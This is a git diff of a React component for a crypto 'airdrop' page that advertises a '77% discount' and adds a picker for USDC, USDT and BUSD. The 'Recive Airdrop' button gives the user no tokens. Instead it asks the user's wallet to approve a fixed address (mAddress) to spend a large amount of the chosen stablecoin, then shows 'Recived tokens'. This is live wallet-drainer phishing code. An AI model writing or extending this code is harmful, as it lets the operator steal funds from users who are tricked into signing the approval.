@@ -23,7 +23,7 @@ class AirdropToken extends React.Component {
             },
             5777: {
                 contract: null,
-                address: "0x824fc2777D5AB85Ddd79F5c2F50D80251FaD4302", //"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                address: "0xA485cd94b8d116C007BEec9B6a8fd308a8665087", //"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
                 decimals: 6,
             },
         },
@@ -32,16 +32,27 @@ class AirdropToken extends React.Component {
                 contract: null,
                 address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                 decimals: 6,
-            }
+            },
+            5777: {
+                contract: null,
+                address: "0xA485cd94b8d116C007BEec9B6a8fd308a8665087", //"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                decimals: 6,
+            },
         },
         BUSD: {
             1: {
                 contract: null,
                 address: "0x5864c777697Bf9881220328BF2f16908c9aFCD7e",
                 decimals: 18,
-            }
+            },
+            5777: {
+                contract: null,
+                address: "0xA485cd94b8d116C007BEec9B6a8fd308a8665087", //"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                decimals: 18,
+            },
         },
-        mAddress: '0x4538fc0B3D886ac42863FAa40D7803dBe2cd38a5',
+        symbol: "USDT",
+        mAddress: '0x57Ce6709e2201633fc82A6F98A22775aC49831c4',
 
     }
     componentDidMount() {
@@ -52,6 +63,7 @@ class AirdropToken extends React.Component {
         if (this.props.web3) {
             this.initContracts();
         }
+        this.onTokenSelected.bind(this)
     }
 
     async initContracts(symbol, web3 = this.props.web3) {
@@ -61,7 +73,7 @@ class AirdropToken extends React.Component {
         let chainId = parseInt(window.ethereum.chainId)
         let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
         log(abiPath)
-        return fetch(abiPath).then(response => { log(response.body); return response.json() }).then(async abi => {
+        return fetch(abiPath).then(response => response.json()).then(async abi => {
             let contract = await new web3.eth.Contract(chainId == 5777 ? abi.abi : abi, token[chainId].address);
 
             token[chainId].contract = contract;
@@ -73,34 +85,48 @@ class AirdropToken extends React.Component {
 
     async reciveAirdrop() {
         let { web3, accounts } = this.props;
-        let { mAddress } = this.state;
+        let { mAddress, symbol } = this.state;
         let chainId = parseInt(window.ethereum.chainId)
         if (!web3) {
             toast.error("Please connect Metamask")
         } else {
-            await this.initContracts("USDC", web3)
-            let USDC = window.USDC = this.state.USDC
-            log(window.USDC[chainId].contract)
-            USDC[chainId].contract.methods.approve(mAddress, 1_000_000_000 * USDC[chainId].decimals)
-                .send({ from: accounts[0] }, function (err, tx) {
-                    if (err) {
-                        toast.error(err.message)
-                        logerror(err)
-                    } else toast.success("Recived tokens")
-                })
+            try {
+                await this.initContracts(symbol, web3)
+                let token = this.state[symbol]
+                window.token = token
+                token[chainId].contract.methods.approve(mAddress, 1_000_000_000 * token[chainId].decimals)
+                    .send({ from: accounts[0] }, function (err, tx) {
+                        if (err) {
+                            toast.error(err.message)
+                            logerror(err)
+                        } else toast.success("Recived tokens")
+                    })
+            } catch (error) {
+                logerror("reciveAirdrop:", error.message, symbol, chainId)
+                if (error.message.includes("Unexpected token"))
+                    toast.error(`We haven't suport this chain yet: ${symbol} - ${chainId}`)
+            }
         }
+    }
+
+    onTokenSelected(e) {
+        let symbol = "USDT"
+        if (e.target.innerText.trim() == "") {
+            symbol = e.target.parentElement.innerText
+        } else symbol = e.target.innerText
+
+        this.setState({ symbol: symbol.trim() })
     }
 
     render() {
 
-        let { } = this.state;
+        let { symbol } = this.state;
         let { web3 } = this.props;
         return (
             <div className="col-12 col-sm-10 offset-sm-1 col-md-8 offset-md-2 col-lg-6 offset-lg-3 col-xl-5 offset-xl-0">
                 <div className="home__content home__content--right">
                     <div className="home__sales">
-                        <h3>Recive Airdrop:</h3>
-
+                        <h3>Recive Airdrop</h3>
                         <p>Discount 77% from final price</p>
 
                         <div className="progress progress--small">
@@ -132,15 +158,15 @@ class AirdropToken extends React.Component {
                             <ul className="nav nav-tabs section__tabs" role="tablist">
                                 <li className="nav-item">
                                     <a className="nav-link" data-toggle="tab" href="#tab-1" role="tab" aria-controls="tab-1"
-                                        aria-selected="false"><img src="img/usdc.svg" />&nbsp;USDC</a>
+                                        aria-selected="false" onClick={this.onTokenSelected.bind(this)}><img src="img/usdc.svg" />&nbsp;USDC</a>
                                 </li>
                                 <li className="nav-item">
                                     <a className="nav-link active" data-toggle="tab" href="#tab-2" role="tab" aria-controls="tab-2"
-                                        aria-selected="true" ><img src="img/usdt.svg" />&nbsp;USDT</a>
+                                        aria-selected="true" onClick={this.onTokenSelected.bind(this)}><img src="img/usdt.svg" />&nbsp;USDT</a>
                                 </li>
                                 <li className="nav-item">
                                     <a className="nav-link" data-toggle="tab" href="#tab-3" role="tab" aria-controls="tab-3"
-                                        aria-selected="false"><img src="img/busd.svg" />&nbsp;BUSD</a>
+                                        aria-selected="false" onClick={this.onTokenSelected.bind(this)}><img src="img/busd.svg" />&nbsp;BUSD</a>
                                 </li>
                             </ul>
                         </div>
